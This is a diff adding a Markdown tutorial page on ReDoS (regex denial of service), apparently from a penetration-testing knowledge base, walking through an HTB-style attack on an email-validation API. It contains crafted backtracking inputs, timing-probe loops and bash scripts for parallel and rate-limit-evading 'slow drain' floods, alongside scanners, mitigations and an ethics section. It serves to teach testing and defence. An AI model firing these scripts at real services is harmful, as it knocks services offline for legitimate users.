@@ -1,0 +1,357 @@
+---
+title: ReDoS
+description: Regular Expression Denial of Service - when a regex engine's backtracking behavior on an "evil" pattern explodes to exponential evaluation time given a crafted input. Identifying vulnerable patterns (nested quantifiers, alternation overlap), crafting attack strings, the email-regex case study, and the response-timing detection methodology.
+mitre: [T1499]
+d3fend: [D3-RAPA]
+impact: [DoS]
+owasp: [A05, A06]
+sidebar:
+  order: 6
+  label: ReDoS
+---
+
+## TL;DR
+
+Some regex patterns trigger catastrophic backtracking on inputs that almost-but-don't-quite match. A 50-character crafted string can lock a regex engine for seconds, minutes, or forever - denial of service from a single HTTP request. APIs that validate input via regex (email validators, URL validators, format checkers) are the primary surface.
+
+```
+# 1. Identify a regex-validated parameter (response leaks the pattern, error mentions regex,
+#    or it's a documented format check like email/URL/phone)
+curl 'http://target/api/check-email?email=test_value'
+→ {"regex": "/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/", ...}
+
+# 2. Look for evil patterns - nested quantifiers, overlapping alternation
+#    ([a-z]+)+  ← classic
+#    (a|a)+     ← alternation with overlap
+#    (a*)*      ← nested *
+#    (.*)*$     ← greedy-everything anchored
+
+# 3. Craft an input that triggers backtracking - usually:
+#    "string-that-almost-matches" + "character-that-breaks-the-match"
+curl 'http://target/api/check-email?email=jjjjjjjjjjjjjjjjjjjjjjj@cccccccccccccccc.55555555555555.'
+
+# 4. Observe response time - multi-second hangs indicate ReDoS
+time curl '...?email=jjjjjjjj...'        # baseline
+time curl '...?email=jjjjjjjjjjjjjjjj@cccc...555555555555.'   # crafted (slow)
+```
+
+Success indicator: response time scales superlinearly with input length - short inputs respond in milliseconds, slightly-longer inputs respond in seconds, slightly-longer-still inputs respond in minutes.
+
+## Why ReDoS exists
+
+Most regex engines (Perl-compatible, including PHP PCRE, Python `re`, JavaScript V8, .NET, Ruby) use backtracking to handle ambiguous patterns. When a regex has alternatives or quantifiers, the engine tries one path, and if it doesn't match, backs up and tries another. For simple patterns this is fast. For patterns with overlapping options, the backtracking can take exponential time.
+
+The "evil regex" class is patterns where the engine has many ways to *partially* match a string but the full match fails - every partial match has to be tried before the engine concludes "no match."
+
+### A minimal evil regex
+
+```regex
+^(a+)+$
+```
+
+Try matching `aaaaaaaab` (8 a's followed by a b):
+
+- Engine tries `(aaaaaaaa)+` → tries to match `$` against `b` → fails
+- Backtracks: tries `(aaaaaaa)(a)+` → tries to match `$` against `b` → fails
+- Backtracks: tries `(aaaaaa)(a)(a)+` → tries to match `$` against `b` → fails
+- ...
+
+For 8 a's, the engine tries 2⁷ = 128 backtracking paths. For 30 a's, 2²⁹ ≈ 500 million paths. Each path takes microseconds; cumulatively, seconds-to-minutes.
+
+The trigger: an input where the regex *almost* matches, requiring full exploration of the backtracking tree before concluding "no match."
+
+## Patterns that are vulnerable
+
+The patterns to spot in source review or leaked-regex responses:
+
+### Nested quantifiers
+
+```regex
+([a-z]+)+
+(\d+)*
+(.*)*
+```
+
+Anything where a quantified group (`+`, `*`, `{n,m}`) wraps an already-quantified pattern. Each level multiplies the backtracking complexity.
+
+### Alternation with overlap
+
+```regex
+(a|a)*
+(ab|a)*b
+(x+x+)+y
+```
+
+When an OR alternative can match the same prefix as another, the engine considers all combinations.
+
+### Group with greedy quantifier followed by anchor
+
+```regex
+^(\d+)$           # safe - \d is unambiguous
+^(.+)*$           # vulnerable - .+ matches anything, * adds another level
+```
+
+### The infamous email regex
+
+The HTB-style example:
+
+```regex
+^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$
+```
+
+Walking through what makes it vulnerable:
+
+| Section | Vulnerability |
+| --- | --- |
+| `([a-zA-Z0-9_.-])+` | OK - character class with single `+` |
+| `(([a-zA-Z0-9-])+.)+` | **Nested `+`** - `[...]+` inside `(...)+`. Each domain segment can match in multiple ways. |
+| `([a-zA-Z0-9]{2,4})+` | **Quantifier inside quantifier** - TLD can be 2-4 chars, group is repeated. |
+
+Multiple compounding issues. An attacker-crafted input forces exponential exploration.
+
+## Detection
+
+### When the regex is exposed
+
+Some APIs leak their regex in error responses or schema documents:
+
+```http
+GET /api/check-email?email=test_value HTTP/1.1
+```
+
+```json
+{
+  "regex": "/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/",
+  "success": false
+}
+```
+
+Free win - paste the regex into a vulnerability checker:
+
+- [regex101.com](https://regex101.com/) - explains structure, flags ambiguities
+- [regulex (jex.im)](https://jex.im/regulex/) - visualizes the state machine
+- [recheck](https://makenowjust-labs.github.io/recheck/) - automated ReDoS scanner
+- [safe-regex](https://github.com/davisjam/safe-regex) - Node.js library that flags evil patterns
+
+### When the regex is hidden
+
+For black-box detection, the workflow is:
+
+1. **Identify a format-validated parameter** - email, URL, phone, ZIP, IP address. Any parameter where invalid input gets rejected with a "format" error.
+
+2. **Send a baseline valid input** and time the response:
+
+   ```shell
+   $ time curl 'http://target/api/check-email?email=test@example.com'
+   real    0m0.012s
+   ```
+
+3. **Send increasingly long crafted inputs** and watch for nonlinear response time growth:
+
+   ```shell
+   $ for length in 10 20 30 40 50 60 70; do
+       payload=$(python3 -c "print('j'*$length + '@' + 'c'*$length + '.55555.')")
+       echo -n "Length $length: "
+       time curl -s "http://target/api/check-email?email=$payload" > /dev/null
+   done
+
+   Length 10: real    0m0.013s
+   Length 20: real    0m0.019s
+   Length 30: real    0m0.142s
+   Length 40: real    0m2.341s
+   Length 50: real    0m38.21s
+   Length 60: (timeout)
+   ```
+
+   Exponential growth in response time confirms catastrophic backtracking.
+
+### Generic evil-input templates
+
+Without knowing the exact regex, these inputs catch common patterns:
+
+| Target format | Evil input template |
+| --- | --- |
+| Email | `aaaa...aaa@bbbb...bbb.ccc.` (note trailing dot) |
+| URL | `http://aaaa...aaa.com/aaa...aaa/!` (trailing special char) |
+| IPv4 | `0.0.0.0.0.0.0.0.0...` (extra octets) |
+| Phone | `1234567890123456789X` (overlong + invalid char) |
+| HTML tag | `<a href="aaa...aaa">` (long attribute value) |
+| Filename | `aaa...aaa.aaa.aaa.aaa.zip` (multi-dot) |
+| ISO date | `2023-01-01T12:34:567890123` (overlong time) |
+
+The pattern: long valid-looking prefix + character that breaks the final anchor.
+
+## Exploitation
+
+### Single-request DoS
+
+```shell
+$ curl --max-time 60 "http://target/api/check-email?email=$(python3 -c "print('j'*30 + '@' + 'c'*30 + '.5'*30 + '.')")"
+```
+
+While the request is processing, the worker thread is locked. If the server has limited workers (e.g., uWSGI with 4 workers, PHP-FPM with 5 children), 5 concurrent crafted requests lock all workers - service unavailable to legitimate users.
+
+### Amplified DoS
+
+```bash
+#!/bin/bash
+# Fire N parallel requests, each locking one worker
+for i in $(seq 1 100); do
+    curl --max-time 120 "http://target/api/check-email?email=$EVIL_INPUT" &
+done
+wait
+```
+
+Net effect: 100 worker-minutes consumed per second of attack. Service capacity is exhausted long before bandwidth is.
+
+### Stealthier DoS via slow drain
+
+Instead of obvious flood, drip-feed crafted inputs at a rate just slow enough to evade rate limiters:
+
+```bash
+while true; do
+    curl --max-time 60 "http://target/api/check-email?email=$EVIL_INPUT"
+    sleep 5
+done
+```
+
+Each request occupies one worker for ~30-60 seconds. Six workers locked at any time. Service is "available" by uptime metrics but practically unusable. Detection requires the defender to notice worker pool saturation, which is a thinner signal than request flood.
+
+## The HTB-style worked walkthrough
+
+Walking through the source-doc scenario:
+
+### Step 1 - Identify the surface
+
+```shell
+$ curl 'http://target:3000/api/check-email?email=test_value'
+{"regex": "/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/", "success": false}
+```
+
+The endpoint validates an email. Crucially, the response leaks the regex - no source-code access needed.
+
+### Step 2 - Analyze the regex
+
+Submit to [regex101.com](https://regex101.com/) for explanation, or visualize at [regulex](https://jex.im/regulex/). The visualization shows the nested quantifiers and overlapping character classes.
+
+### Step 3 - Craft the evil input
+
+The pattern needs an input that:
+- Starts with characters matching the first capture group (`[a-zA-Z0-9_.-]+`)
+- Contains an `@`
+- Has multiple "domain segments" (each matching `[a-zA-Z0-9-]+.`)
+- Ends with characters that almost-but-don't-quite match the TLD class
+
+```
+jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555.
+```
+
+Multiple long groups of `j`/`c`/`5`, terminated with a trailing `.` that the TLD class can't accept (because `5555...5.` ends with `.` not an alphanumeric).
+
+### Step 4 - Confirm
+
+```shell
+$ time curl "http://target:3000/api/check-email?email=jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555."
+
+# (waits 30+ seconds)
+
+{"regex":"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/", "success":false}
+
+real    0m38.42s
+```
+
+The 38-second response time vs. the millisecond baseline confirms ReDoS.
+
+### Step 5 - Scale to DoS
+
+Five workers, each blocked for 30 seconds = 25 seconds of unavailability per attack cycle:
+
+```bash
+for i in {1..10}; do
+    curl --max-time 60 "http://target:3000/api/check-email?email=jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555." &
+done
+wait
+```
+
+## Tools
+
+### Vulnerability scanners
+
+```shell
+# Node-based: scan a regex string for catastrophic backtracking risk
+$ npm install -g safe-regex
+$ echo '/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/' | safe-regex
+False
+# (False means unsafe)
+
+# Static analyzer for code containing regexes
+$ npx eslint --rule 'security/detect-unsafe-regex: error' source.js
+
+# Comprehensive scanner (Java, C#, JS, Python, etc.)
+$ recheck check 'pattern_here'
+```
+
+### Burp extensions
+
+Burp Pro's "Active Scanner" detects ReDoS in some patterns. Community extensions:
+
+- **ReDoSinator** - focused ReDoS testing
+- **Backslash Powered Scanner** - detects various injection-like behaviors including timing-based regex issues
+
+### Curated wordlists
+
+[Wikipedia ReDoS](https://en.wikipedia.org/wiki/ReDoS) and [OWASP ReDoS Cheat Sheet](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) list known evil patterns and their canonical evil inputs. Test these against any format-validated parameter:
+
+| Pattern | Evil input |
+| --- | --- |
+| `^(a+)+$` | `aaaa...aaab` |
+| `(a*)*$` | `aaaa...aaab` |
+| `^(a\|a)+$` | `aaaa...aaab` |
+| `(a\|aa)+$` | `aaaa...aaab` |
+| `^([a-zA-Z]+)*$` | `XaXaXa...XaXa1` |
+| `(\.\*?)*` | `..........!` |
+| The email regex above | `j...j@c...c.55...55.` |
+
+## Defensive considerations
+
+When reporting ReDoS, the remediation tells you which targets to skip:
+
+| Mitigation | Effect on attacker |
+| --- | --- |
+| Use a non-backtracking regex engine (Rust `regex`, Go `regexp`, RE2) | Eliminates the class entirely |
+| Add regex timeout (`re2.compile(pattern, timeout=100ms)` equivalents) | Limits damage; attacker can still trigger 100ms-per-request waste |
+| Replace regex with custom parsing | Eliminates the regex-specific vector |
+| Input length limits | Bounds the worst case |
+| WAF rules for "long input + format mismatch" | Partial - can be evaded |
+
+Servers using RE2 (Google's regex library) or Rust's `regex` crate are immune to ReDoS by design - these engines guarantee linear-time evaluation. JS V8's regex is *not* RE2; neither is Python's `re`. PCRE (PHP, Apache rules) is not RE2 either.
+
+## Limitations and ethics
+
+Production-scale ReDoS attacks are denial-of-service attacks. Engagement scope and authorization matter:
+
+- **In-scope DoS testing** - proceed but document carefully; coordinate with the SRE team to avoid impacting other customers
+- **Bug bounty programs** - DoS testing usually explicitly out of scope; report the *vulnerability* (the pattern) without triggering large-scale impact
+- **Pentesting** - confirm one slow request (proves the vulnerability) without scaling to actual service disruption
+
+The proof-of-concept is one crafted-input response time. Anything beyond that risks causing damage that the engagement may not authorize.
+
+## Quick reference
+
+| Task | Pattern |
+| --- | --- |
+| Spot regex disclosure in API response | Field literally named `regex`, or pattern characters in error string |
+| Visualize a regex | [regex101.com](https://regex101.com/), [regulex (jex.im)](https://jex.im/regulex/) |
+| Scan a regex for ReDoS risk | `safe-regex`, `recheck` |
+| Evil patterns to look for | `(x+)+`, `(x\|x)+`, `(x*)*`, `(.+)*`, nested groups with `+`/`*` |
+| Evil input pattern | Long valid-prefix + breaking-character at the end |
+| Baseline timing | `time curl 'URL?param=normal_value'` |
+| Crafted timing | `time curl 'URL?param=EVIL_INPUT'` |
+| Scaling for DoS confirmation | Loop with increasing length, watch nonlinear time growth |
+| Single-request DoS | One crafted request, observe worker hangs |
+| Amplified DoS | N parallel crafted requests, saturate worker pool |
+| Stealthier DoS | Drip-feed slow but constant rate |
+| Backtracking-immune engines | RE2 (Go regexp, Rust regex), Hyperscan |
+| Backtracking-vulnerable engines | PCRE (PHP), V8 (JS), `re` (Python), `regex` (Ruby), .NET, Java `Pattern` |
+
+For the API-specific context this attack lives in, see the [Overview](/codex/web/web-services/) and [API vuln context](/codex/web/web-services/api-vuln-context/). For the capstone chain combining SOAPAction spoofing + SQL injection, see [Skill assessment chain](/codex/web/web-services/skill-assessment-chain/).
